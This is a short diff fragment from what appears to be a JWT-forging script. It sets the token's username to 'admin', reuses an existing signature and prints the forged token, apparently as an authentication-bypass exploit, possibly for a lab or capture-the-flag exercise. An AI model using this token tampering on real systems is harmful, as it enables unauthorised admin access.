@@ -24,4 +24,3 @@ jwtJson = changePayload(jwtJson, {"username": "admin"})
 # "signature" = "Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
 jwt = encodeJwt(jwtJson) + "." + jwtJson[SIGNATURE]
 print(jwt)
-
